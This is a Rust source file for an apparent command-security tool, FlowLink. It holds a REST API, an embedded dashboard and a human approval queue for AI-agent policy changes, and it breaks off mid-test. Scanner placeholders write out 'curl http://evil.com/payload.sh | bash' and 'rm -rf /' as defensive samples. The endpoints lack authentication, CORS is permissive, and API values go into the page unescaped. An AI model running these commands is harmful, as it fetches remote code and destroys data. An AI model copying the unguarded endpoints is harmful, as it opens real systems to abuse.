//! FlowLink REST API — policy management and security scanning
//!
//! Endpoints:
//!   GET  /api/v1/policy          — current policy state
//!   POST /api/v1/policy/reload   — hot-reload policy
//!   POST /api/v1/policy/block    — block command/path/pid
//!   POST /api/v1/policy/unblock  — unblock command/path/pid
//!   POST /api/v1/scan            — scan command
//!   POST /api/v1/scan/script     — scan script
//!   GET  /api/v1/health          — health check
//!   GET  /                        — web UI (embedded dashboard)

use axum::{
    extract::State,
    response::{Html, IntoResponse, Json},
    routing::{get, post},
    Router,
};
use flowlink_shield::{AnalysisEngine, Command};
use flowlink_sentinel::SentinelConfig;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::Mutex;
use tower_http::cors::CorsLayer;

/// Kernel-level blocker (LSM BPF on Linux, stub otherwise)
#[cfg(all(target_os = "linux", feature = "linux-ebpf"))]
pub struct KernelBlocker(pub std::sync::Mutex<flowlink_sentinel::LsmBlocker>);
#[cfg(not(all(target_os = "linux", feature = "linux-ebpf")))]
pub struct KernelBlocker;

impl KernelBlocker {
    #[cfg(all(target_os = "linux", feature = "linux-ebpf"))]
    pub fn try_load(config: &SentinelConfig) -> Option<Self> {
        match flowlink_sentinel::LsmBlocker::load() {
            Ok(mut blocker) => {
                if let Err(e) = blocker.load_config(config) {
                    tracing::warn!("LSM config load failed: {}", e);
                } else {
                    tracing::info!(
                        "🔒 LSM BPF active: {} commands, {} paths",
                        blocker.blocked_commands().len(),
                        blocker.protected_paths().len()
                    );
                }
                Some(KernelBlocker(std::sync::Mutex::new(blocker)))
            }
            Err(e) => {
                tracing::warn!("LSM BPF unavailable (userspace-only): {}", e);
                None
            }
        }
    }

    #[cfg(not(all(target_os = "linux", feature = "linux-ebpf")))]
    pub fn try_load(_config: &SentinelConfig) -> Option<Self> { None }

    #[cfg(all(target_os = "linux", feature = "linux-ebpf"))]
    pub fn block_cmd(&self, cmd: &str) -> anyhow::Result<()> {
        self.0.lock().map_err(|e| anyhow::anyhow!("lock: {}", e))?.block_command(cmd)
    }
    #[cfg(not(all(target_os = "linux", feature = "linux-ebpf")))]
    pub fn block_cmd(&self, _cmd: &str) -> anyhow::Result<()> { Ok(()) }

    #[cfg(all(target_os = "linux", feature = "linux-ebpf"))]
    pub fn unblock_cmd(&self, cmd: &str) -> anyhow::Result<()> {
        self.0.lock().map_err(|e| anyhow::anyhow!("lock: {}", e))?.unblock_command(cmd)
    }
    #[cfg(not(all(target_os = "linux", feature = "linux-ebpf")))]
    pub fn unblock_cmd(&self, _cmd: &str) -> anyhow::Result<()> { Ok(()) }

    #[cfg(all(target_os = "linux", feature = "linux-ebpf"))]
    pub fn protect_path(&self, path: &str) -> anyhow::Result<()> {
        self.0.lock().map_err(|e| anyhow::anyhow!("lock: {}", e))?.protect_path(path)
    }
    #[cfg(not(all(target_os = "linux", feature = "linux-ebpf")))]
    pub fn protect_path(&self, _path: &str) -> anyhow::Result<()> { Ok(()) }

    #[cfg(all(target_os = "linux", feature = "linux-ebpf"))]
    pub fn unprotect_path(&self, path: &str) -> anyhow::Result<()> {
        self.0.lock().map_err(|e| anyhow::anyhow!("lock: {}", e))?.unprotect_path(path)
    }
    #[cfg(not(all(target_os = "linux", feature = "linux-ebpf")))]
    pub fn unprotect_path(&self, _path: &str) -> anyhow::Result<()> { Ok(()) }
}

/// Shared application state
pub struct AppState {
    pub engine: AnalysisEngine,
    pub config: Mutex<SentinelConfig>,
    pub blocked_commands: Mutex<Vec<BlockedItem>>,
    pub protected_paths: Mutex<Vec<BlockedItem>>,
    pub blocked_pids: Mutex<Vec<BlockedItem>>,
    pub whitelisted_pids: Mutex<Vec<u32>>,
    /// Pending approval requests from AI agents
    pub approvals: Mutex<Vec<ApprovalRequest>>,
    /// Kernel-level BPF LSM blocker
    pub kernel: Option<KernelBlocker>,
}

/// Approval request from an agent
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalRequest {
    pub id: String,
    pub action: ApprovalAction,
    pub value: String,
    pub reason: String,
    pub requested_by: String,
    pub requested_at: String,
    pub status: ApprovalStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ApprovalAction {
    BlockCommand,
    UnblockCommand,
    ProtectPath,
    UnprotectPath,
    BlockPid,
    WhitelistPid,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum ApprovalStatus {
    Pending,
    Approved,
    Rejected,
    Expired,
}

/// Blocked item with reason and timestamp
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlockedItem {
    pub value: String,
    pub reason: String,
    pub blocked_at: String,
}

// ── Request types ──────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
pub struct ScanRequest {
    pub command: String,
    #[serde(default)]
    pub context: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct ScriptScanRequest {
    pub script: String,
    #[serde(default)]
    pub language: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct BlockRequest {
    pub kind: BlockKind,
    pub value: String,
    #[serde(default)]
    pub reason: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct UnblockRequest {
    pub kind: BlockKind,
    pub value: String,
}

#[derive(Debug, Deserialize)]
#[allow(non_camel_case_types)]
pub enum BlockKind {
    command,
    path,
    pid,
}

#[derive(Debug, Deserialize)]
pub struct WhitelistRequest {
    pub pid: u32,
    #[serde(default)]
    pub reason: Option<String>,
}

// ── Response types ─────────────────────────────────────────────────────────

#[derive(Serialize)]
#[allow(dead_code)]
struct ApiResponse<T: Serialize> {
    status: &'static str,
    data: T,
}

#[derive(Serialize)]
#[allow(dead_code)]
struct ApiError {
    status: &'static str,
    error: String,
}

// ── Handlers ───────────────────────────────────────────────────────────────

pub async fn health() -> &'static str {
    "ok"
}

pub async fn get_policy(State(state): State<Arc<AppState>>) -> Json<serde_json::Value> {
    let config = state.config.lock().await;
    let blocked = state.blocked_commands.lock().await;
    let paths = state.protected_paths.lock().await;
    let pids = state.blocked_pids.lock().await;
    let wl = state.whitelisted_pids.lock().await;

    Json(serde_json::json!({
        "status": "active",
        "analysis_levels": ["L1", "L1.5", "L2", "L3"],
        "kernel_blocking": {
            "linux_lsm_bpf": "available (requires CONFIG_BPF_LSM=y)",
            "macos_esf_auth": "available (requires root + entitlement)"
        },
        "default_policy": {
            "blocked_commands": config.critical_binaries,
            "protected_paths": config.protected_paths,
            "action_on_block": "deny (EPERM)"
        },
        "runtime_policy": {
            "blocked_commands": *blocked,
            "protected_paths": *paths,
            "blocked_pids": *pids,
            "whitelisted_pids": *wl
        }
    }))
}

pub async fn reload_policy(State(state): State<Arc<AppState>>) -> Json<serde_json::Value> {
    let mut config = state.config.lock().await;
    // Reload from default — in production this reads from file
    *config = SentinelConfig::default();
    Json(serde_json::json!({
        "status": "reloaded",
        "message": "Policy hot-reloaded successfully"
    }))
}

pub async fn block_item(
    State(state): State<Arc<AppState>>,
    Json(req): Json<BlockRequest>,
) -> impl IntoResponse {
    let reason = req.reason.unwrap_or_else(|| "manual block via API".into());
    let now = chrono_now();
    let action = match req.kind {
        BlockKind::command => ApprovalAction::BlockCommand,
        BlockKind::path => ApprovalAction::ProtectPath,
        BlockKind::pid => ApprovalAction::BlockPid,
    };
    let _id = format!("apr_{}{}", &req.value.as_bytes().iter().take(4).map(|b| format!("{:02x}", b)).collect::<String>(), now.chars().take(4).collect::<String>());

    // Direct API call (from Dashboard/Telegram) — apply immediately
    let item = BlockedItem { value: req.value.clone(), reason: reason.clone(), blocked_at: now };
    let mut kernel_status = "userspace";
    match req.kind {
        BlockKind::command => {
            state.blocked_commands.lock().await.push(item);
            if let Some(ref kb) = state.kernel {
                if kb.block_cmd(&req.value).is_ok() { kernel_status = "kernel"; }
            }
        }
        BlockKind::path => {
            state.protected_paths.lock().await.push(item);
            if let Some(ref kb) = state.kernel {
                if kb.protect_path(&req.value).is_ok() { kernel_status = "kernel"; }
            }
        }
        BlockKind::pid => { state.blocked_pids.lock().await.push(item); }
    }

    Json(serde_json::json!({
        "status": "applied",
        "action": format!("{:?}", action),
        "value": req.value,
        "enforcement": kernel_status
    }))
}

pub async fn unblock_item(
    State(state): State<Arc<AppState>>,
    Json(req): Json<UnblockRequest>,
) -> Json<serde_json::Value> {
    let mut kernel_status = "userspace";
    match req.kind {
        BlockKind::command => {
            let mut list = state.blocked_commands.lock().await;
            list.retain(|i| i.value != req.value);
            if let Some(ref kb) = state.kernel {
                if kb.unblock_cmd(&req.value).is_ok() { kernel_status = "kernel"; }
            }
        }
        BlockKind::path => {
            let mut list = state.protected_paths.lock().await;
            list.retain(|i| i.value != req.value);
            if let Some(ref kb) = state.kernel {
                if kb.unprotect_path(&req.value).is_ok() { kernel_status = "kernel"; }
            }
        }
        BlockKind::pid => {
            let mut list = state.blocked_pids.lock().await;
            list.retain(|i| i.value != req.value);
        }
    }
    Json(serde_json::json!({
        "status": "unblocked",
        "kind": format!("{:?}", req.kind),
        "value": req.value,
        "enforcement": kernel_status
    }))
}

pub async fn whitelist_pid(
    State(state): State<Arc<AppState>>,
    Json(req): Json<WhitelistRequest>,
) -> Json<serde_json::Value> {
    state.whitelisted_pids.lock().await.push(req.pid);
    Json(serde_json::json!({
        "status": "whitelisted",
        "pid": req.pid,
        "effect": "This PID bypasses all security checks"
    }))
}

pub async fn scan_command(
    State(state): State<Arc<AppState>>,
    Json(req): Json<ScanRequest>,
) -> Json<serde_json::Value> {
    if req.command.is_empty() {
        return Json(serde_json::json!({
            "risk_level": "safe",
            "explanation": "Empty command"
        }));
    }

    let cmd = parse_command(&req.command);
    let result = state.engine.analyze(&cmd);

    match result.threat {
        Some(threat) => {
            let mut resp = serde_json::json!({
                "risk_level": format!("{:?}", threat.level).to_lowercase(),
                "threat_id": threat.id,
                "threat_name": threat.name,
                "explanation": threat.description,
                "score": threat_level_to_score(&threat.level),
                "analysis_level": result.level_used,
                "safe": false
            });
            if let Some(s) = threat.suggestion {
                resp["suggestion"] = serde_json::json!(s);
            }
            Json(resp)
        }
        None => Json(serde_json::json!({
            "risk_level": "safe",
            "score": 0,
            "explanation": "No threats detected",
            "analysis_level": result.level_used,
            "safe": true
        })),
    }
}

pub async fn scan_script(
    State(state): State<Arc<AppState>>,
    Json(req): Json<ScriptScanRequest>,
) -> Json<serde_json::Value> {
    let mut lines = Vec::new();
    let mut max_score: u32 = 0;
    let mut overall_risk = "safe";

    for (i, line) in req.script.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            lines.push(serde_json::json!({
                "line": i + 1,
                "content": line,
                "risk_level": "safe",
                "score": 0
            }));
            continue;
        }
        let cmd = parse_command(trimmed);
        let result = state.engine.analyze(&cmd);
        match result.threat {
            Some(t) => {
                if threat_level_to_score(&t.level) > max_score {
                    max_score = threat_level_to_score(&t.level);
                    overall_risk = match t.level {
                        flowlink_shield::ThreatLevel::Critical => "critical",
                        flowlink_shield::ThreatLevel::High => "danger",
                        flowlink_shield::ThreatLevel::Medium => "warning",
                        flowlink_shield::ThreatLevel::Low => "info",
                    };
                }
                lines.push(serde_json::json!({
                    "line": i + 1,
                    "content": line,
                    "risk_level": format!("{:?}", t.level).to_lowercase(),
                    "threat_id": t.id,
                    "explanation": t.description,
                    "score": threat_level_to_score(&t.level)
                }));
            }
            None => {
                lines.push(serde_json::json!({
                    "line": i + 1,
                    "content": line,
                    "risk_level": "safe",
                    "score": 0
                }));
            }
        }
    }

    Json(serde_json::json!({
        "overall_risk_level": overall_risk,
        "max_score": max_score,
        "lines": lines
    }))
}

/// Serve embedded dashboard UI
pub async fn dashboard() -> Html<&'static str> {
    Html(DASHBOARD_HTML)
}

// ── Build API router ───────────────────────────────────────────────────────

// ── Approval Queue Handlers ────────────────────────────────────────────────

/// Create an approval request (called by MCP when agent requests a policy change)
pub async fn create_approval_request(
    State(state): State<Arc<AppState>>,
    Json(req): Json<ApprovalRequest>,
) -> Json<serde_json::Value> {
    let mut approvals = state.approvals.lock().await;
    let id = req.id.clone();
    approvals.push(req);
    Json(serde_json::json!({
        "status": "pending",
        "id": id,
        "message": "Approval request created. Awaiting user confirmation.",
        "approve_url": format!("/api/v1/approvals/{}/approve", id),
        "reject_url": format!("/api/v1/approvals/{}/reject", id)
    }))
}

/// List all pending approval requests
pub async fn list_approvals(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    let approvals = state.approvals.lock().await;
    let pending: Vec<&ApprovalRequest> = approvals
        .iter()
        .filter(|a| a.status == ApprovalStatus::Pending)
        .collect();
    Json(serde_json::json!({
        "pending": pending,
        "total_pending": pending.len()
    }))
}

/// Approve a pending request — applies the policy change
pub async fn approve_request(
    State(state): State<Arc<AppState>>,
    axum::extract::Path(id): axum::extract::Path<String>,
) -> Json<serde_json::Value> {
    let mut approvals = state.approvals.lock().await;

    // Find and update the request
    let req = match approvals.iter_mut().find(|a| a.id == id) {
        Some(r) if r.status == ApprovalStatus::Pending => r,
        Some(r) => {
            return Json(serde_json::json!({
                "status": "error",
                "error": format!("Request already {:?}", r.status)
            }))
        }
        None => return Json(serde_json::json!({"status": "error", "error": "Not found"})),
    };

    // Apply the action
    let now = chrono_now();
    let item = BlockedItem {
        value: req.value.clone(),
        reason: format!("{} (approved via {})", req.reason, id),
        blocked_at: now,
    };

    match req.action {
        ApprovalAction::BlockCommand => {
            state.blocked_commands.lock().await.push(item);
        }
        ApprovalAction::UnblockCommand => {
            let mut list = state.blocked_commands.lock().await;
            list.retain(|i| i.value != req.value);
        }
        ApprovalAction::ProtectPath => {
            state.protected_paths.lock().await.push(item);
        }
        ApprovalAction::UnprotectPath => {
            let mut list = state.protected_paths.lock().await;
            list.retain(|i| i.value != req.value);
        }
        ApprovalAction::BlockPid => {
            state.blocked_pids.lock().await.push(item);
        }
        ApprovalAction::WhitelistPid => {
            if let Ok(pid) = req.value.parse::<u32>() {
                state.whitelisted_pids.lock().await.push(pid);
            }
        }
    }

    req.status = ApprovalStatus::Approved;

    Json(serde_json::json!({
        "status": "approved",
        "id": id,
        "action": format!("{:?}", req.action),
        "value": req.value,
        "message": "Policy change applied successfully"
    }))
}

/// Reject a pending request
pub async fn reject_request(
    State(state): State<Arc<AppState>>,
    axum::extract::Path(id): axum::extract::Path<String>,
) -> Json<serde_json::Value> {
    let mut approvals = state.approvals.lock().await;
    match approvals.iter_mut().find(|a| a.id == id) {
        Some(r) if r.status == ApprovalStatus::Pending => {
            r.status = ApprovalStatus::Rejected;
            Json(serde_json::json!({
                "status": "rejected",
                "id": id,
                "message": "Request rejected by user"
            }))
        }
        Some(r) => Json(serde_json::json!({
            "status": "error",
            "error": format!("Request already {:?}", r.status)
        })),
        None => Json(serde_json::json!({"status": "error", "error": "Not found"})),
    }
}

pub fn build_router(state: Arc<AppState>) -> Router {
    Router::new()
        .route("/", get(dashboard))
        .route("/api/v1/health", get(health))
        .route("/api/v1/policy", get(get_policy))
        .route("/api/v1/policy/reload", post(reload_policy))
        .route("/api/v1/policy/block", post(block_item))
        .route("/api/v1/policy/unblock", post(unblock_item))
        .route("/api/v1/policy/whitelist", post(whitelist_pid))
        .route("/api/v1/scan", post(scan_command))
        .route("/api/v1/scan/script", post(scan_script))
        // ── Approval queue (for agent-initiated requests) ──
        .route("/api/v1/approvals", get(list_approvals))
        .route("/api/v1/approvals/{id}/approve", post(approve_request))
        .route("/api/v1/approvals/{id}/reject", post(reject_request))
        .route("/api/v1/approvals/request", post(create_approval_request))
        .layer(CorsLayer::permissive())
        .with_state(state)
}

fn parse_command(cmd_str: &str) -> Command {
    let parts: Vec<&str> = cmd_str.split_whitespace().collect();
    let binary = parts.first().unwrap_or(&"").to_string();
    let args = parts.iter().skip(1).map(|s| s.to_string()).collect();
    Command {
        raw: cmd_str.to_string(),
        binary,
        args,
    }
}

fn chrono_now() -> String {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
        .to_string()
}

// ── Embedded Dashboard HTML ────────────────────────────────────────────────

const DASHBOARD_HTML: &str = r##"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FlowLink — Policy Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.container{max-width:1200px;margin:0 auto;padding:20px}
header{display:flex;align-items:center;gap:16px;padding:20px 0;border-bottom:1px solid #1a1a2e;margin-bottom:24px}
header h1{font-size:24px;background:linear-gradient(135deg,#6366f1,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
header span{font-size:13px;color:#666;padding:4px 12px;border:1px solid #1a1a2e;border-radius:20px}
.badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600}
.badge-danger{background:#dc26261a;color:#f87171}
.badge-warning{background:#f59e0b1a;color:#fbbf24}
.badge-safe{background:#22c55e1a;color:#4ade80}
.badge-critical{background:#ef44441a;color:#f87171}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(360px,1fr));gap:20px}
.card{background:#111118;border:1px solid #1a1a2e;border-radius:12px;padding:20px}
.card h2{font-size:16px;color:#888;margin-bottom:16px;display:flex;align-items:center;gap:8px}
.card h2::before{content:'';width:3px;height:16px;background:#6366f1;border-radius:2px}
input,textarea,select{width:100%;padding:10px 14px;background:#0a0a0f;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-size:14px;outline:none;transition:border .2s}
input:focus,textarea:focus,select:focus{border-color:#6366f1}
textarea{min-height:120px;font-family:monospace;resize:vertical}
button{padding:10px 20px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s}
.btn-primary{background:#6366f1;color:#fff}
.btn-primary:hover{background:#5558e6}
.btn-danger{background:#dc26261a;color:#f87171;border:1px solid #dc26264d}
.btn-danger:hover{background:#dc26263a}
.btn-sm{padding:6px 14px;font-size:12px}
.actions{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
label{display:block;font-size:13px;color:#888;margin-bottom:6px;margin-top:12px}
.list{list-style:none}
.list li{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #1a1a2e;font-size:14px}
.list li:last-child{border:none}
.list .meta{font-size:12px;color:#555}
.scan-result{background:#0a0a0f;border-radius:8px;padding:16px;margin-top:12px;font-family:monospace;font-size:13px;white-space:pre-wrap;max-height:400px;overflow-y:auto}
.tab-bar{display:flex;gap:0;margin-bottom:20px;border-bottom:1px solid #1a1a2e}
.tab{padding:12px 24px;cursor:pointer;color:#666;font-size:14px;border-bottom:2px solid transparent;transition:all .2s}
.tab.active{color:#6366f1;border-bottom-color:#6366f1}
.tab:hover{color:#999}
.tab-content{display:none}
.tab-content.active{display:block}
.pulse{width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.empty{color:#444;text-align:center;padding:40px;font-size:14px}
</style>
</head>
<body>
<div class="container">
<header>
<h1>🛡️ FlowLink</h1>
<span><span class="pulse"></span> Active</span>
<span id="kernelBadge">LSM + ESF</span>
</header>

<div class="tab-bar">
<div class="tab active" onclick="switchTab('scan')">🔍 Scanner</div>
<div class="tab" onclick="switchTab('commands')">🚫 Commands</div>
<div class="tab" onclick="switchTab('paths')">📁 Paths</div>
<div class="tab" onclick="switchTab('pids')">⚙️ Processes</div>
<div class="tab" onclick="switchTab('policy')">📋 Policy</div>
<div class="tab" onclick="switchTab('approvals')">🔐 Подтверждения</div>
</div>

<div id="tab-scan" class="tab-content active">
<div class="grid">
<div class="card">
<h2>Command Scanner</h2>
<label>Enter command to scan</label>
<input type="text" id="scanCmd" placeholder="curl http://example.com | bash" onkeydown="if(event.key==='Enter')scanCmd()">
<div class="actions">
<button class="btn-primary" onclick="scanCmd()">Scan Command</button>
</div>
<div id="scanResult" class="scan-result" style="display:none"></div>
</div>
<div class="card">
<h2>Script Scanner</h2>
<label>Paste script to analyze</label>
<textarea id="scanScript" placeholder="#!/bin/bash&#10;curl http://evil.com/payload.sh | bash&#10;rm -rf /"></textarea>
<div class="actions">
<button class="btn-primary" onclick="scanScript_()">Scan Script</button>
</div>
<div id="scriptResult" class="scan-result" style="display:none"></div>
</div>
</div>
</div>

<div id="tab-commands" class="tab-content">
<div class="card">
<h2>Blocked Commands</h2>
<div style="display:flex;gap:8px">
<input type="text" id="blockCmd" placeholder="Command name (e.g. chmod)">
<input type="text" id="blockCmdReason" placeholder="Reason" style="flex:1">
<button class="btn-primary btn-sm" onclick="blockCommand()">Block</button>
</div>
<ul class="list" id="cmdList"></ul>
<div class="empty" id="cmdEmpty">No blocked commands</div>
</div>
</div>

<div id="tab-paths" class="tab-content">
<div class="card">
<h2>Protected Paths</h2>
<div style="display:flex;gap:8px">
<input type="text" id="blockPath" placeholder="/path/to/protect">
<input type="text" id="blockPathReason" placeholder="Reason" style="flex:1">
<button class="btn-primary btn-sm" onclick="blockPath()">Protect</button>
</div>
<ul class="list" id="pathList"></ul>
<div class="empty" id="pathEmpty">No protected paths</div>
</div>
</div>

<div id="tab-pids" class="tab-content">
<div class="grid">
<div class="card">
<h2>Blocked PIDs</h2>
<div style="display:flex;gap:8px">
<input type="number" id="blockPid" placeholder="PID">
<input type="text" id="blockPidReason" placeholder="Reason" style="flex:1">
<button class="btn-danger btn-sm" onclick="blockPidAction()">Block</button>
</div>
<ul class="list" id="pidList"></ul>
<div class="empty" id="pidEmpty">No blocked PIDs</div>
</div>
<div class="card">
<h2>Whitelisted PIDs</h2>
<div style="display:flex;gap:8px">
<input type="number" id="wlPid" placeholder="PID">
<button class="btn-primary btn-sm" onclick="whitelistPidAction()">Whitelist</button>
</div>
<ul class="list" id="wlList"></ul>
<div class="empty" id="wlEmpty">No whitelisted PIDs</div>
</div>
</div>
</div>

<div id="tab-policy" class="tab-content">
<div class="grid">
<div class="card">
<h2>Current Policy</h2>
<div class="actions">
<button class="btn-primary" onclick="loadPolicy()">Refresh</button>
<button class="btn-danger" onclick="reloadPolicy()">Reload from Config</button>
</div>
<div id="policyResult" class="scan-result"></div>
</div>
<div class="card">
<h2>Kernel Blocking Status</h2>
<div id="kernelStatus" class="scan-result">Loading...</div>
</div>
</div>
</div>
</div>

<div id="tab-approvals" class="tab-content">
<div class="grid">
<div class="card">
<h2>Ожидают подтверждения</h2>
<p style="color:#666;font-size:13px;margin-bottom:12px">Запросы от ИИ-агентов на изменение политики безопасности</p>
<div class="actions">
<button class="btn-primary" onclick="loadApprovals()">Обновить</button>
</div>
<ul class="list" id="approvalList"></ul>
<div class="empty" id="approvalEmpty">No pending approvals</div>
</div>
<div class="card">
<h2>История</h2>
<ul class="list" id="approvalHistory"></ul>
<div class="empty" id="historyEmpty">No history</div>
</div>
</div>
</div>

</div>

<script>
const API='';
async function api(path,opts){try{const r=await fetch(API+path,{headers:{'Content-Type':'application/json'},...opts});return await r.json()}catch(e){return{error:e.message}}}

function switchTab(id){document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.getElementById('tab-'+id).classList.add('active');event.target.classList.add('active')}

async function scanCmd(){const cmd=document.getElementById('scanCmd').value;if(!cmd)return;const r=await api('/api/v1/scan',{method:'POST',body:JSON.stringify({command:cmd})});const el=document.getElementById('scanResult');el.style.display='block';if(r.error){el.textContent='Error: '+r.error;return}
const cls=r.risk_level==='safe'?'badge-safe':r.risk_level==='high'||r.risk_level==='critical'?'badge-danger':'badge-warning';
el.innerHTML=`<span class="badge ${cls}">${r.risk_level.toUpperCase()}</span> Score: ${r.score||0}\n${r.explanation||'No threats'}\n${r.suggestion?'Suggestion: '+r.suggestion:''}\nAnalysis: L${r.analysis_level}`}

async function scanScript_(){const s=document.getElementById('scanScript').value;if(!s)return;const r=await api('/api/v1/scan/script',{method:'POST',body:JSON.stringify({script:s})});const el=document.getElementById('scriptResult');el.style.display='block';if(r.error){el.textContent='Error: '+r.error;return}
let out=`Overall: ${r.overall_risk_level} (max score: ${r.max_score})\n\n`;(r.lines||[]).forEach(l=>{if(l.threat_id){out+=`L${l.line}: <span class="badge badge-danger">${l.risk_level}</span> ${l.explanation}\n`}else{out+=`L${l.line}: safe\n`}});el.innerHTML=out}

async function loadPolicy(){const r=await api('/api/v1/policy');document.getElementById('policyResult').textContent=JSON.stringify(r,null,2);
const ks=r.kernel_blocking||{};document.getElementById('kernelStatus').textContent=`Linux LSM BPF: ${ks.linux_lsm_bpf||'N/A'}\nmacOS ESF Auth: ${ks.macos_esf_auth||'N/A'}`;
const dp=r.default_policy||{};
const cl=document.getElementById('cmdList');cl.innerHTML='';const ce=document.getElementById('cmdEmpty');
(dp.blocked_commands||[]).concat((r.runtime_policy||{}).blocked_commands||[]).map(v=>typeof v==='string'?{value:v,reason:'default'}:v).forEach(i=>{ce.style.display='none';const li=document.createElement('li');li.innerHTML=`<span><code>${i.value}</code> <span class="meta">${i.reason}</span></span><button class="btn-danger btn-sm" onclick="unblock('command','${i.value}')">Unblock</button>`;cl.appendChild(li)});
const pl=document.getElementById('pathList');pl.innerHTML='';const pe=document.getElementById('pathEmpty');
(dp.protected_paths||[]).concat((r.runtime_policy||{}).protected_paths||[]).map(v=>typeof v==='string'?{value:v,reason:'default'}:v).forEach(i=>{pe.style.display='none';const li=document.createElement('li');li.innerHTML=`<span><code>${i.value}</code> <span class="meta">${i.reason}</span></span><button class="btn-danger btn-sm" onclick="unblock('path','${i.value}')">Unprotect</button>`;pl.appendChild(li)})}

async function blockCommand(){const c=document.getElementById('blockCmd').value,r=document.getElementById('blockCmdReason').value;if(!c)return;await api('/api/v1/policy/block',{method:'POST',body:JSON.stringify({kind:'command',value:c,reason:r||'manual'})});document.getElementById('blockCmd').value='';loadPolicy()}
async function blockPath(){const p=document.getElementById('blockPath').value,r=document.getElementById('blockPathReason').value;if(!p)return;await api('/api/v1/policy/block',{method:'POST',body:JSON.stringify({kind:'path',value:p,reason:r||'manual'})});document.getElementById('blockPath').value='';loadPolicy()}
async function blockPidAction(){const p=document.getElementById('blockPid').value,r=document.getElementById('blockPidReason').value;if(!p)return;await api('/api/v1/policy/block',{method:'POST',body:JSON.stringify({kind:'pid',value:p,reason:r||'manual'})});document.getElementById('blockPid').value='';loadPolicy()}
async function whitelistPidAction(){const p=document.getElementById('wlPid').value;if(!p)return;await api('/api/v1/policy/whitelist',{method:'POST',body:JSON.stringify({pid:parseInt(p)})});document.getElementById('wlPid').value='';loadPolicy()}
async function unblock(kind,value){await api('/api/v1/policy/unblock',{method:'POST',body:JSON.stringify({kind,value})});loadPolicy()}
async function reloadPolicy(){await api('/api/v1/policy/reload',{method:'POST'});loadPolicy()}

loadPolicy();
loadApprovals();

let approvalHistory=[];

async function loadApprovals(){
const r=await api('/api/v1/approvals');
const list=document.getElementById('approvalList');
const empty=document.getElementById('approvalEmpty');
list.innerHTML='';
const pending=r.pending||[];
if(pending.length===0){empty.style.display='block';return}
empty.style.display='none';
pending.forEach(a=>{
const li=document.createElement('li');
li.innerHTML=`<span><b>${a.action}</b>: <code>${a.value}</code><br><span class="meta">${a.reason} — ${a.requested_by||'agent'}</span></span><span><button class="btn-primary btn-sm" onclick="doApprove('${a.id}')">✓ Подтвердить</button> <button class="btn-danger btn-sm" onclick="doReject('${a.id}')">✗ Отклонить</button></span>`;
list.appendChild(li)
})
}

async function doApprove(id){
const r=await api('/api/v1/approvals/'+id+'/approve',{method:'POST'});
if(r.status==='approved'){loadApprovals();loadPolicy();
approvalHistory.unshift({id,action:'approved',at:Date.now()});
renderHistory()}
}
async function doReject(id){
const r=await api('/api/v1/approvals/'+id+'/reject',{method:'POST'});
if(r.status==='rejected'){loadApprovals();
approvalHistory.unshift({id,action:'rejected',at:Date.now()});
renderHistory()}
}

function renderHistory(){
const list=document.getElementById('approvalHistory');
const empty=document.getElementById('historyEmpty');
list.innerHTML='';
if(approvalHistory.length===0){empty.style.display='block';return}
empty.style.display='none';
approvalHistory.forEach(h=>{
const li=document.createElement('li');
const cls=h.action==='approved'?'badge-safe':'badge-danger';
li.innerHTML=`<span><code>${h.id}</code> <span class="badge ${cls}">${h.action}</span></span><span class="meta">${new Date(h.at).toLocaleTimeString()}</span>`;
list.appendChild(li)
})
}
</script>
</body>
</html>"##;

fn threat_level_to_score(level: &flowlink_shield::ThreatLevel) -> u32 {
    match level {
        flowlink_shield::ThreatLevel::Critical => 100,
        flowlink_shield::ThreatLevel::High => 75,
        flowlink_shield::ThreatLevel::Medium => 50,
        flowlink_shield::ThreatLevel::Low => 25,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── parse_command ──

    #[test]
    fn parse_empty_string() {
        let cmd = parse_command("");
        assert_eq!(cmd.binary, "");
        assert!(cmd.args.is_empty());
        assert_eq!(cmd.raw, "");
    }

    #[test]
    fn parse_whitespace_only() {
        let cmd = parse_command("   ");
        assert_eq!(cmd.binary, "");
        assert!(cmd.args.is_empty());
    }

    #[test]
    fn parse_single_word() {
        let cmd = parse_command("ls");
        assert_eq!(cmd.binary, "ls");
        assert!(cmd.args.is_empty());
        assert_eq!(cmd.raw, "ls");
    }

    #[test]
    fn parse_multiple_args() {
        let cmd = parse_command("git push --force origin");
        assert_eq!(cmd.binary, "git");
        assert_eq!(cmd.args, vec!["push", "--force", "origin"]);
        assert_eq!(cmd.raw, "git push --force origin");
    }

    #[test]
    fn parse_command_with_pipe() {
        let cmd = parse_command("cat file | grep pattern");
        assert_eq!(cmd.binary, "cat");
        assert_eq!(cmd.args, vec!["file", "|", "grep", "pattern"]);
    }

    #[test]
